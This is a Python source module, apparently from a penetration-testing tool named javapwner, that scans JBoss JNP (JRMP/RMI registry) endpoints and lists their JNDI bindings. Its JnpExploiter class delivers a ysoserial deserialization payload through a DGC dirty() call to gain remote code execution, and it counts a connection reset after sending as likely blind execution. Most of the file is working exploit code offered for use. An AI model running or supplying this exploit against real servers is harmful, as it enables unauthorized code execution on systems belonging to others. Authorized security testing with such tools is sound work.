"""JBoss JNP (Java Naming Protocol) scanner and exploiter.

JNP is JBoss AS 4.x–6.x's JNDI naming service.  Despite its custom name,
the transport is standard JRMP (Java Remote Method Protocol): JNP runs an
RMI Registry on port 1099 / 4444 that exposes EJBs, DataSources and other
JNDI bindings.

Detection strategy
------------------
1. Perform a JRMP handshake.
2. Send a Registry ``list()`` call — the same technique as the RMI scanner.
3. If bound names are returned, classify the endpoint as JNP by checking
   whether the names look like JBoss JNDI paths (e.g. ``java:/``,
   ``jboss/``, ``jms/``, ``ejb/``).
4. If a non-JBoss registry responds, set ``is_jnp=False`` but still return
   the bound names.

Exploitation
------------
JNP deserialises the argument to Registry methods without filtering,
making it vulnerable to the same deserialization attacks as classic RMI.
``JnpExploiter.exploit()`` delivers a ysoserial payload via DGC dirty().
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field
from typing import Any

from javapwner.core.serialization import detect_exception_in_stream
from javapwner.core.socket_helper import TCPSession
from javapwner.exceptions import ConnectionError as JPConnectionError
from javapwner.protocols.rmi.protocol import (
    DGC_OBJID,
    MSG_CALL,
    build_jrmp_handshake,
    build_list_call,
    parse_jrmp_ack,
    parse_registry_return,
)

_RECV_TIMEOUT = 4.0
_DGC_OP_INDEX = struct.pack(">i", 1)
# DGC interface hash — 0xF6B6898D8BF28643 = -669196253586618813 signed
_DGC_INTERFACE_HASH = struct.pack(">q", -669196253586618813)

# Strings in bound names that indicate a JBoss JNDI tree
_JBOSS_JNDI_KEYWORDS = (
    "java:/", "jboss/", "jms/", "ejb/", "mail/", "XAConnectionFactory",
    "ConnectionFactory", "queue/", "topic/", "jmx/", "datasource",
    "JNDIView", "jndi",
)


@dataclass
class JnpScanResult:
    """Result of scanning a JNP endpoint."""
    host: str
    port: int
    is_open: bool = False
    is_jrmp: bool = False
    is_jnp: bool = False
    bound_names: list[str] = field(default_factory=list)
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "port": self.port,
            "is_open": self.is_open,
            "is_jrmp": self.is_jrmp,
            "is_jnp": self.is_jnp,
            "bound_names": self.bound_names,
            "error": self.error,
        }


@dataclass
class JnpExploitResult:
    """Result of a JNP exploit attempt."""
    sent: bool = False
    likely_success: bool = False
    response_bytes: bytes = field(default=b"", repr=False)
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "sent": self.sent,
            "likely_success": self.likely_success,
            "error": self.error,
        }


class JnpScanner:
    """Detect and enumerate a JBoss JNP service via standard JRMP.

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    DEFAULT_PORT = 4444

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def scan(self, host: str, port: int) -> JnpScanResult:
        """Probe *host:port* for a JNP service using JRMP Registry list()."""
        result = JnpScanResult(host=host, port=port)

        # Step 1: JRMP handshake
        try:
            with TCPSession(host, port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    result.error = "No response to JRMP handshake"
                    return result
                result.is_open = True
                try:
                    parse_jrmp_ack(ack_data)
                except ValueError as exc:
                    result.error = str(exc)
                    return result
                result.is_jrmp = True
        except JPConnectionError as exc:
            result.error = str(exc)
            return result

        # Step 2: Registry list()
        try:
            with TCPSession(host, port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    return result
                try:
                    parse_jrmp_ack(ack_data)
                except ValueError:
                    return result

                sess.send(build_list_call())
                raw = sess.recv_all(timeout=_RECV_TIMEOUT)
                if not raw:
                    return result

                parsed = parse_registry_return(raw)
                names = parsed.get("names", [])
                result.bound_names = names

                # Step 3: classify as JNP by checking name patterns
                if names:
                    jndi_lower = [n.lower() for n in names]
                    result.is_jnp = any(
                        any(kw.lower() in n for kw in _JBOSS_JNDI_KEYWORDS)
                        for n in jndi_lower
                    )
                    if not result.is_jnp:
                        # Fallback: any non-empty registry on port 4444 is likely JNP
                        result.is_jnp = (port == self.DEFAULT_PORT)
                else:
                    # Empty or no registry — mark as JNP only if JRMP confirmed on 4444
                    result.is_jnp = result.is_jrmp and (port == self.DEFAULT_PORT)

        except JPConnectionError:
            pass

        return result


class JnpExploiter:
    """Deliver a ysoserial payload via JBoss JNP using DGC dirty().

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def exploit(
        self, host: str, port: int, payload_bytes: bytes
    ) -> JnpExploitResult:
        """Send *payload_bytes* to the JNP endpoint via DGC dirty().

        JNP runs on standard JRMP, so the DGC endpoint is always present
        and deserialises the argument without filtering (JEP 290 is not
        applied on JBoss AS 4.x–6.x).
        """
        result = JnpExploitResult()

        dgc_call = (
            bytes([MSG_CALL])
            + DGC_OBJID
            + _DGC_OP_INDEX
            + _DGC_INTERFACE_HASH
            + payload_bytes
        )

        try:
            with TCPSession(host, port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    result.error = "No JRMP handshake response"
                    return result
                try:
                    parse_jrmp_ack(ack_data)
                except ValueError as exc:
                    result.error = str(exc)
                    return result

                sess.send(dgc_call)
                result.sent = True

                try:
                    response = sess.recv_all(timeout=_RECV_TIMEOUT)
                    result.response_bytes = response
                    if detect_exception_in_stream(response):
                        result.likely_success = False
                    else:
                        result.likely_success = True
                except Exception:
                    result.likely_success = True  # blind execution

        except JPConnectionError as exc:
            if result.sent:
                result.likely_success = True  # connection reset after send = likely executed
            else:
                result.error = str(exc)

        return result
